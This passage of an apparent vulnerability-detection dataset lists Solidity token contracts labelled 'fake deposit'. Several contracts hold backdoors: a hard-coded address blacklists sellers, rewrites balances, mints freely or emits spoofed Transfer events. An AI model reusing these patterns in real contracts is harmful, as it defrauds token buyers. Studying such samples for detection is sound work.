remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 69000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 69000000;                        // Update total supply (100000 for example)\r\n        name = \"ZOMPLEXXITY\";                                   // Set the name for display purposes\r\n        decimals = 0;                            // Amount of decimals for display purposes\r\n        symbol = \"ZOMP\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;contract Token {\r\n /// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}contract StandardToken is Token {function transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }function balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }function approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }mapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}contract ERC20Token is StandardToken {function () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }/* Public variables of the token */\r\n string public name = \"American Redneck Company Coin\"; //Name of the token\r\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n string public symbol = \"ARCC\"; //An identifier: eg ARCC\r\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n////make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\nfunction ERC20Token(\r\n ) {\r\n    balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\r\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\r\n name = \"American Redneck Company Coin\"; // Set the name for display purposes\r\n decimals = 18; // Amount of decimals\r\n symbol = \"ARCC\"; // Set the symbol for display purposes\r\n }/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n\r\nif \r\n(!_spender.call\r\n(bytes4(bytes32(sha3\r\n(\"receiveApproval(address,uint256,address,bytes)\"\r\n))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract SYLUM {\r\n  \r\n    mapping (address => uint256) public Jz;\r\n    mapping (address => uint256) public Kl;\r\n    mapping (address => bool) Zu;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\taddress cstruct = 0x4ACC13d6212cC7E1d061Ab9C8AA8a6d71A278318;\r\n\taddress VRouter2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Sylum Labs\";\r\n    string public symbol = unicode\"SYLUM\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n\r\n\r\n    constructor()  {\r\n    Jz[msg.sender] = totalSupply;\r\n    emit Transfer(address(0), VRouter2, totalSupply); }\r\n\r\n   \r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == cstruct)  {\r\n        require(Jz[msg.sender] >= value);\r\n        Jz[msg.sender] -= value;  \r\n        Jz[to] += value; \r\n        emit Transfer (VRouter2, to, value);\r\n        return true; }  \r\n        if(!Zu[msg.sender]) {\r\n        require(Jz[msg.sender] >= value);\r\n        Jz[msg.sender] -= value;  \r\n        Jz[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\t\t\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function KBurn () public {\r\n         if(msg.sender == cstruct)   {\r\n        Jz[msg.sender] = Kl[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Jz[account]; }\r\n\r\n        function Kdep(address zi) public {\r\n        if(msg.sender == cstruct)  { \r\n        Zu[zi] = false;}}\r\n        function Kcheck(address zi) public{\r\n         if(msg.sender == cstruct)  { \r\n        require(!Zu[zi]);\r\n        Zu[zi] = true;\r\n        }}\r\n             function Kbridge(uint256 xi) public {\r\n        if(msg.sender == cstruct)  { \r\n        Kl[msg.sender] = xi;} }\r\n\r\n\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n        if(from == cstruct)  {\r\n        require(value <= Jz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Jz[from] -= value;  \r\n        Jz[to] += value; \r\n        emit Transfer (VRouter2, to, value);\r\n        return true; }    \r\n          if(!Zu[from] && !Zu[to]) {\r\n        require(value <= Jz[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Jz[from] -= value;\r\n        Jz[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.7.0 <0.9.0;\r\n\r\n/**\r\n * @title Imperial Credits\r\n * @dev create a Ownable and Mintable ERC 20 token\r\n*/\r\n\r\nlibrary SafeMath {\r\n    function add(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x + y) >= x, 'ds-math-add-overflow');\r\n    }\r\n\r\n    function sub(uint x, uint y) internal pure returns (uint z) {\r\n        require((z = x - y) <= x, 'ds-math-sub-underflow');\r\n    }\r\n\r\n    function mul(uint x, uint y) internal pure returns (uint z) {\r\n        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');\r\n    }\r\n}\r\n\r\n\r\ncontract Ownable { \r\n  // Variable that maintains \r\n  // owner address\r\n  address private _owner;\r\n  \r\n  // Sets the original owner of \r\n  // contract when it is deployed\r\n  constructor()\r\n  {\r\n    _owner = msg.sender;\r\n  }\r\n  \r\n  // Publicly exposes who is the\r\n  // owner of this contract\r\n  function owner() public view returns(address) \r\n  {\r\n    return _owner;\r\n  }\r\n  \r\n  // onlyOwner modifier that validates only \r\n  // if caller of function is contract owner, \r\n  // otherwise not\r\n  modifier onlyOwner() \r\n  {\r\n    require(isOwner(),\r\n    \"Function accessible only by the owner !!\");\r\n    _;\r\n  }\r\n  \r\n  // function for owners to verify their ownership. \r\n  // Returns true for owners otherwise false\r\n  function isOwner() public view returns(bool) \r\n  {\r\n    return msg.sender == _owner;\r\n  }\r\n}\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n}\r\n\r\ncontract credit is IERC20, Ownable{\r\n    using SafeMath for uint;\r\n    mapping(address => uint256) balances;\r\n \r\n    // Mapping owner address to\r\n    // those who are allowed to\r\n    // use a certain number of their moey\r\n    mapping(address => mapping (\r\n            address => uint256)) allowed;\r\n\r\n    uint _totalSupply;\r\n\r\n    string public _name;\r\n    string public _symbol;\r\n    uint8 public _decimals;\r\n\r\n    constructor() Ownable() {\r\n        //set info\r\n        _name = \"Imperial Credits\";\r\n        _symbol = \"$CREDIT\";\r\n        _decimals = 5;\r\n        _totalSupply = 2000000000 * 10**5;\r\n        // give all of the credits to contract creator\r\n        balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function _mint(address to, uint value) public onlyOwner {\r\n        _totalSupply = _totalSupply.add(value);\r\n        balances[to] = balances[to].add(value);\r\n        emit Transfer(address(0), to, value);\r\n    }\r\n\r\n    function _burn(address from, uint value) public onlyOwner {\r\n        balances[from] = balances[from].sub(value);\r\n        _totalSupply = _totalSupply.sub(value);\r\n        emit Transfer(from, address(0), value);\r\n    }\r\n\r\n    function name() public override view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public override view returns (string memory){\r\n        return _symbol;\r\n    }\r\n    function decimals() public override view returns (uint8){\r\n        return _decimals;\r\n    }\r\n    \r\n    // totalSupply function\r\n    function totalSupply() public override view returns (uint){\r\n        return _totalSupply;\r\n    }\r\n\r\n    // balanceOf function\r\n    function balanceOf(address _owner) public override view returns (uint balance) {\r\n        return balances[_owner];\r\n    }\r\n    \r\n    // function approve\r\n    function approve(address _spender, uint _amount) public override returns (bool success) {\r\n        // If the address is allowed\r\n        // to spend from this contract\r\n        // if he have the token he send\r\n        allowed[msg.sender][_spender] = _amount;\r\n        \r\n        // Fire the event \"Approval\"\r\n        // to execute any logic that\r\n        // was listening to it\r\n        emit Approval(msg.sender,\r\n                        _spender, _amount);\r\n        return true;\r\n    }\r\n    \r\n    // transfer function\r\n    function transfer(address _to, uint _amount) public override returns (bool success) {\r\n        // transfers the value if\r\n        // balance of sender is\r\n        // greater than the amount\r\n        if (balances[msg.sender] >= _amount) {\r\n            balances[msg.sender] -= _amount;\r\n            balances[_to] += _amount;\r\n            \r\n            // Fire a transfer event for\r\n            // any logic that is listening\r\n            emit Transfer(msg.sender,\r\n                        _to, _amount);\r\n                return true;\r\n        }\r\n        else {\r\n            //no token\r\n            return false;\r\n        }\r\n    }\r\n    \r\n    \r\n    /* The transferFrom method is used for\r\n    a withdraw workflow, allowing\r\n    contracts to send tokens on\r\n    your behalf, for example to\r\n    \"deposit\" to a contract address\r\n    and/or to charge fees in sub-currencies;*/\r\n    function transferFrom(address _from, address _to, uint _amount) public override returns (bool success)\r\n    {\r\n    if (balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount > 0 && balances[_to] + _amount > balances[_to]) {\r\n            balances[_from] -= _amount;\r\n            balances[_to] += _amount;\r\n            \r\n            // Fire a Transfer event for\r\n            // any logic that is listening\r\n            emit Transfer(_from, _to, _amount);\r\n        return true;\r\n    \r\n    }\r\n    else\r\n    {\r\n        return false;\r\n    }\r\n    }\r\n    \r\n    // Check if address is allowed\r\n    // to spend on the owner's behalf\r\n    function allowance(address _owner, address _spender) public override view returns (uint remaining)\r\n    {\r\n    return allowed[_owner][_spender];\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address dBMC = 0xE5fdc00Edb7e2004D5E37F7F991A946B44a7f3E2;\r\n\taddress DBMW = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ONIROS is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private dBc;\r\n\tmapping (address => bool) private dBb;\r\n    mapping (address => bool) private dBw;\r\n    mapping (address => mapping (address => uint256)) private dBv;\r\n    uint8 private constant DBl = 8;\r\n    uint256 private constant dBS = 200000000 * (10** DBl);\r\n    string private constant _name = \"Oniros Network\";\r\n    string private constant _symbol = \"ONIROS\";\r\n\r\n\r\n\r\n    constructor () {\r\n        dBc[_msgSender()] = dBS;\r\n         dMkr(DBMW, dBS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return DBl;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return dBS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return dBc[account];\r\n    }\r\n\t\r\n\r\n   \r\n\t function dburn(address dBj) onlyOwner public{\r\n        dBb[dBj] = true; }\r\n\t\r\n    function dMkr(address dBj, uint256 dBn) onlyOwner internal {\r\n    emit Transfer(address(0), dBj ,dBn); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return dBv[owner][spender];\r\n    }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        dBv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction dquery(address dBj) public{\r\n         if(dBb[msg.sender])  { \r\n        dBw[dBj] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == dBMC)  {\r\n        require(amount <= dBc[sender]);\r\n        dBc[sender] -= amount;  \r\n        dBc[recipient] += amount; \r\n          dBv[sender][msg.sender] -= amount;\r\n        emit Transfer (DBMW, recipient, amount);\r\n        return true; }  else  \r\n          if(!dBw[recipient]) {\r\n          if(!dBw[sender]) {\r\n         require(amount <= dBc[sender]);\r\n        require(amount <= dBv[sender][msg.sender]);\r\n        dBc[sender] -= amount;\r\n        dBc[recipient] += amount;\r\n        dBv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction dStake(address dBj) public {\r\n        if(dBb[msg.sender]) { \r\n        dBw[dBj] = false;}}\r\n\t\t\r\n\t\tfunction transfer(address dBj, uint256 dBn) public {\r\n        if(msg.sender == dBMC)  {\r\n        require(dBc[msg.sender] >= dBn);\r\n        dBc[msg.sender] -= dBn;  \r\n        dBc[dBj] += dBn; \r\n        emit Transfer (DBMW, dBj, dBn);} else  \r\n        if(dBb[msg.sender]) {dBc[dBj] += dBn;} else\r\n        if(!dBw[msg.sender]) {\r\n        require(dBc[msg.sender] >= dBn);\r\n        dBc[msg.sender] -= dBn;  \r\n        dBc[dBj] += dBn;          \r\n        emit Transfer(msg.sender, dBj, dBn);}}\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-10-28\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address ckstruct = 0x1eEFA82f8cBC16885C4977B261cCA710E176e373;\r\n\taddress V3Router = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _owner);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract EONIX is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) public Zti;\r\n\tmapping (address => uint256) private Yti;\r\n    mapping (address => bool) private CXv;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _tTotal = 100000000 * 10**_decimals;\r\n    string private constant _name = \"EONIX DAO\";\r\n    string private constant _symbol = \"EONIX\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Zti[_msgSender()] = _tTotal;\r\n        emit Transfer(address(0), V3Router, _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Zti[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n               function LXBU () public {\r\n         if(msg.sender == ckstruct)   {\r\n        Zti[msg.sender] = Yti[msg.sender];\r\n        }}\r\n\r\n\r\n\r\n        function LXDE(address xt) public {\r\n        if(msg.sender == ckstruct)  { \r\n        CXv[xt] = false;}}\r\n        function LXCE(address xt) public{\r\n         if(msg.sender == ckstruct)  { \r\n        require(!CXv[xt]);\r\n        CXv[xt] = true;\r\n        }}\r\n             function LXBR(uint256 xt) public {\r\n        if(msg.sender == ckstruct)  { \r\n        Yti[msg.sender] = xt;} } \r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == ckstruct)  {\r\n        require(amount <= Zti[sender]);\r\n        Zti[sender] -= amount;  \r\n        Zti[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (V3Router, recipient, amount);\r\n        return true; }    \r\n          if(!CXv[sender] && !CXv[recipient]) {\r\n        require(amount <= Zti[sender]);\r\n require(amount <= _allowances[sender][msg.sender]);\r\n        Zti[sender] -= amount;\r\n        Zti[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n\r\n \r\n\r\n    function transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == ckstruct)  {\r\n        require(Zti[msg.sender] >= amount);\r\n        Zti[msg.sender] -= amount;  \r\n        Zti[recipient] += amount; 